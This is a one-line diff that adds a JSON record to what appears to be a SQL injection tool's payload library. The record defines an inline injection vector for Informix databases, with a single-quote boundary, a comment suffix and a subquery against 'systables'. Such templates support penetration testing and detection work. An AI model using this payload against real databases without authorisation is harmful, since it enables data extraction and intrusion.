@@ -1,0 +1,1 @@
+{"dbms": "informix", "technique": "inline", "boundary": {"prefix": "'", "suffix": "-- -", "type": "single"}, "vector": "{B} AND 1=(SELECT ({Q}) FROM systables WHERE 1=1)", "comment": "informix inline: single, inline comment"}
